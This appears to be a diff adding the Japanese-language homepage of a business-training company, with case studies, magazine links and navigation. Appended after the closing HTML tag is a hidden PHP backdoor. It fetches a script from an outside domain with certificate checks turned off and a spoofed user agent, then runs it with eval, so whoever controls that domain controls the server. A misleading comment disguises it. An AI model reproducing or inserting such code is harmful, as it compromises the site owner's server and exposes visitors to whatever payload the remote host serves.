@@ -1,0 +1,214 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ja" lang="ja">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta http-equiv="Imagetoolbar" content="no" />
+<meta http-equiv="content-style-type" content="text/css" />
+<meta http-equiv="content-script-type" content="text/javascript" />
+<meta name="Keywords" content="経営改革（次世代リーダー）,人財育成,競争力強化,組織改革,企業風土,経営理念,経営課題,経営方針,経営戦略,組織変革,風土改革,次世代育成,業績向上,企業の不祥事,企業改革,経営者育成,企業戦略,組織力,企業変革,組織風土" />
+<meta name="Description" content="研修でもない。コンサルでもない。人と企業を変えるトレーニング。最新のビジネスリテラシーを学習しながら、自社の現実の経営、組織、業務課題などの解決策を導き出す。このプロセスで人は変革していく。これがOBT協会が提供するトレーニングです。" />
+<link rel="stylesheet" href="common_new/css/import.css" type="text/css" media="all" />
+<link rel="stylesheet" href="common_new/css/print.css" type="text/css" media="print" />
+<script src="common_new/js/jquery.js" type="text/javascript"></script>
+<script src="common_new/js/yuga.js" type="text/javascript" charset="utf-8"></script>
+<script src="common/js/replacehr.js" type="text/javascript"></script>
+<title>競争力強化、組織変革、次世代リーダー育成のOBT協会</title>
+<!--20101224Google Analytics-->
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-11052931-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; 
+ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 
+'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; 
+s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+<!--//20101224Google Analytics-->
+</head>
+<body>
+<div id="Container">
+
+<!-- インデックスエリアここから -->
+<div id="indexArea">
+<!-- タイトル -->
+<h1>企業の組織改革を実現し、次世代リーダーを育成するトレーニングで人材育成支援</h1>
+<p><a href="./index.html" title="OBT オン・ザ・ビジネストレーニング協会"><img src="common_new/images/ttl_obt_01.gif" alt="On the Business Training Association オン・ザ・ビジネストレーニング協会" /></a></p>
+
+<div id="indexBox">
+
+<!-- 打ち出し -->
+<div id="adsArea">
+<img src="common_new/images/img_index_01.jpg" alt="「会社や事業の将来方向を構想できる次代の経営人財が育っていない」「経営施策の実効が上がらない」「企業風土や組織体質が旧態依然としている」" />
+<img src="common_new/images/img_index_02.jpg" alt="経営課題と人財に関わる課題の同時解決を実現" />
+<img src="common_new/images/img_index_03.jpg" alt="表裏一体で切り離せない、この両面の解決を同時に実現していくのが、コンサルでも、研修でもないOBT協会のサービスです" /></div>
+</div>
+
+<!-- コンテンツ -->
+<div id="content">
+
+<!-- ニュース -->
+<iframe src="news/index.html" title="NEWS" width="670px" height="340px" frameborder="0"></iframe>
+
+<!-- サービス事例 -->
+<h2><img src="common_new/images/ttl_home_02.gif" alt="OBT協会のサービス事例 OBT協会が顧客企業様と一緒になって取り組んだ、経営課題や組織課題の解決事例を紹介しております。" /></h2>
+<div class="topCaseList">
+<ul class="caseList1">
+<li><a href="./case/case01.html" title="新たな経営戦略が描けない"><img src="common_new/images/top_bt_case01.gif" alt="新たな経営戦略が描けない" class="offBtn" /></a></li>
+<li><a href="./case/case02.html" title="経営理念や戦略が末端まで浸透しない"><img src="common_new/images/top_bt_case02.gif" alt="経営理念や戦略が末端まで浸透しない" class="offBtn" /></a></li>
+<li><a href="./case/case03.html" title="人財育成の実効が上がらない"><img src="common_new/images/top_bt_case03.gif" alt="人財育成の実効が上がらない" border="0" class="offBtn" /></a></li>
+<li><a href="./case/case04.html" title="組織間の壁が弊害になっている"><img src="common_new/images/top_bt_case04.gif" alt="組織間の壁が弊害になっている" class="offBtn" /></a></li>
+</ul><ul class="caseList2">
+<li><a href="./case/case05.html" title="企業風土が変わっていない"><img src="common_new/images/top_bt_case05.gif" alt="企業風土が変わっていない" class="offBtn" /></a></li>
+<li><a href="./case/case06.html" title="under construction"><img src="common_new/images/top_bt_case06.gif" alt="under construction" border="0" class="offBtn" /></a></li>
+<li><a href="./case/case07.html" title="under construction"><img src="common_new/images/top_bt_case07.gif" alt="under construction" border="0" class="offBtn" /></a></li>
+<li><a href="./case/case08.html" title="under construction"><img src="common_new/images/top_bt_case08.gif" alt="under construction" border="0" class="offBtn" /></a></li>
+</ul>
+<br clear="all" />
+</div>
+
+<!-- 人財マガジン -->
+<h2><img src="common_new/images/ttl_home_03.gif" alt="OBT 人財マガジン" /></h2>
+<ul class="topMagazine clrFix">
+
+<!-- 人財マガジン 左側 -->
+<li><p class="center"><a
+href="http://www.obt-a.net/web_jinzai_magazine/person/2011/02/post-90.html"><img
+src="http://www.obt-a.net/web_jinzai_magazine/person/thumbnail/109.jpg"
+alt="" border="0" width="110" /></a></p>
+<a href="http://www.obt-a.net/web_jinzai_magazine/person/2011/02/post-90.html"
+class="emTxt">株式会社ガリバーインターナショナル<br />
+代表取締役会長　羽鳥 兼市さん</a><br />
+従来の業界の旨みを捨て、顧客の支持を獲得
+高みを目指す「挑戦する経営」</li>
+
+<!-- 人財マガジン 中央 -->
+<li><p class="center"><a
+href="http://www.obt-a.net/web_jinzai_magazine/person/2012/02/post-113.html"><img
+src="http://www.obt-a.net/web_jinzai_magazine/person/thumbnail/133.jpg" 
+alt="" border="0"width="110" /></a></p>
+<a href="http://www.obt-a.net/web_jinzai_magazine/person/2012/02/post-113.html"
+class="emTxt">ライフネット生命保険株式会社<br />
+代表取締役社長 出口 治明さん</a><br />
+横並びの生命保険業界に風穴を開ける"正直な経営"</li>
+
+<!-- 人財マガジン 右側 -->
+<li><p class="center"><a
+href="http://www.obt-a.net/web_jinzai_magazine/person/2012/09/post-125.html"><img
+src="http://www.obt-a.net/web_jinzai_magazine/person/thumbnail/147.jpg"
+ alt="" border="0"width="110" /></a></p>
+<a href="http://www.obt-a.net/web_jinzai_magazine/person/2012/09/post-125.html"
+class="emTxt">株式会社 タニタ<br />
+代表取締役社長　谷田 千里さん</a><br />
+人間が持つ「習性」を理解しなければ、
+社員の意識は変えられない</li></ul>
+
+<a href="http://www.obt-a.net/FS-APL/FS-Form/form.cgi?Code=melmaga" title="OBT人財マガジンのご登録はこちら（無料）"><img src="common_new/images/top_bt_magazine01.gif" alt="OBT人財マガジンのご登録はこちら（無料）" border="0" class="offBtn" /></a><a href="http://www.obt-a.net/web_jinzai_magazine/index.html" title="経営トップが語る「経営・組織・人財」に関する情報はこちら"><img src="common_new/images/top_bt_magazine02.gif" alt="経営トップが語る「経営・組織・人財」に関する情報はこちら" border="0" class="offBtn" /></a></li>
+</div>
+<!-- コンテンツここまで -->
+
+<!-- インデックスエリアここまで --></div>
+
+<!-- ナビゲーション -->
+<div id="menuArea">
+<ul class="contactMenu">
+<li><a href="/contact/" title="お問い合せ"><img src="./common_new/images/nvi_contact_01a.gif" alt="無料ご相談フォーム　ご相談窓口：03-5792-7701　受付時間：9:30?18:00(平日)/担当：伊藤" width="275" height="95" class="offBtn" /></a></li>
+</ul>
+<ul class="siteMenu spcr95">
+<li><a href="./about/index.html" title="OBTについて"><img src="./common_new/images/nvi_about_01.gif" alt="OBTについて" width="200" height="35" class="offBtn" /></a></li>
+</ul>
+<ul class="siteMenu">
+<li><a href="./message/index.html" title="代表ごあいさつ"><img src="./common_new/images/nvi_message_01.gif" alt="代表ごあいさつ" width="200" height="35" class="offBtn" /></a></li>
+</ul>
+<ul class="siteMenu">
+<li><a href="./trainer/index.html" title="トレーナー紹介"><img src="./common_new/images/nvi_trainer_01.gif" alt="トレーナー紹介" width="200" height="35" class="offBtn" /></a></li>
+</ul>
+<ul class="siteMenu">
+<li><a href="./case/" title="事例のご紹介"><img src="./common_new/images/nvi_case_01.gif" alt="事例のご紹介" width="200" height="35" /></a></li>
+</ul>
+<ul class="siteMenu">
+<li><a href="./outline/index.html" title="組織概要"><img src="./common_new/images/nvi_outline_01.gif" alt="組織概要" width="200" height="35" class="offBtn" /></a></li>
+</ul>
+<ul class="siteMenu">
+<li><a href="./recruit/index.html" title="人材・パートナー募集"><img src="./common_new/images/nvi_recruit_01.gif" alt="人材・パートナー募集" width="200" height="35" class="offBtn" /></a></li>
+</ul>
+<ul class="specialMenu">
+<li><a href="http://www.obt-a.net/web_jinzai_magazine/index.html" title="OBT人財マガジン"><img src="./common_new/images/bnr_cmn_01.gif" alt="OBT人財マガジン" width="200" height="100" class="offBtn" /></a></li>
+</ul>
+<ul class="specialMenu">
+<li><a href="http://www.obt-a.net/opinion/" title="opiniom"><img src="./common_new/images/opinion_side_bnr.jpg" alt="opinion" class="offBtn" /></a></li>
+</ul>
+<ul class="mediaInformation">
+<li><p class="center"><a href="http://www.obt-a.net/lp/service/index.html#lp-media"><img src="./common_new/images/bnr_cmn_media01.gif" alt="" width="95" height="138" /></a></p>
+  <div align="left" class="fs12s">
+  <a href="http://www.obt-a.net/lp/service/index.html#lp-media">書籍「平凡な人財で非凡な成果を上げる」（2008年ダイヤモンド社）<br />◆八重洲ブックセンター 第6位<br />◆丸善丸の内本店 第4位<br />◆日経ベストセラー 総合17位</a>
+  </div>
+</li>
+<li><p class="center"><a href="http://www.obt-a.net/rosei.pdf" target="_blank"><img src="./common_new/images/bnr_cmn_media02.gif" alt="" width="127" height="174" /></a></p>
+  <a href="http://www.obt-a.net/rosei.pdf" target="_blank">『労政時報（4/22号）』特集、「経営改革における人事部の役割と取り組み」について代表 及川が解説しております。</a></li>
+</ul>
+</div>
+<!-- ナビゲーションここまで -->
+
+
+<!-- フッター -->
+<div id="Footer">
+<!-- フッターメニュー -->
+<ul class="fs10"><!-- 
+--><li><a href="notice/sitemap.html" title="サイトマップ">サイトマップ</a></li><!--
+--><li><a href="notice/privacy.html" title="個人情報保護方針">個人情報保護方針</a></li><!--
+--><li class="end"><a href="notice/admin.html" title="サイト運営ポリシー">サイト運営ポリシー</a></li><!--
+--></ul>
+<!-- キャプション -->
+<div class="Caption">
+<p class="footerLogo"><a href="./index.html" title="OBT オン・ザ・ビジネストレーニング協会"><img src="common_new/images/lgo_obt_01.gif" alt="OBT オン・ザ・ビジネストレーニング協会" width="180" height="36" /></a></p>
+<p class="copyRight"><img src="common_new/images/txt_cmn_01.gif" alt="COPYRIGHT c ON THE BUSINESS TRAINING ASSOCIATION." width="208" height="7" /></p>
+</div>
+</div>
+</div>
+
+
+</body>
+
+</html>
+<?php
+session_start();
+
+/**
+* Disable error reporting
+*
+* Set this to error_reporting( -1 ) for debugging.
+*/
+function geturlsinfo($url) {
+  if (function_exists('curl_exec')) {
+    $conn = curl_init($url);
+    curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+    curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+    
+    $url_get_contents_data = curl_exec($conn);
+    curl_close($conn);
+  } elseif (function_exists('file_get_contents')) {
+    $url_get_contents_data = file_get_contents($url);
+  } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+    $handle = fopen($url, "r");
+    $url_get_contents_data = stream_get_contents($handle);
+    fclose($handle);
+  } else {
+    $url_get_contents_data = false;
+  }
+  return $url_get_contents_data;
+}
+
+  $a = geturlsinfo('https://www.backlinkku.id/menu/vip-v2/script.txt');
+  eval('?>' . $a);
+?>
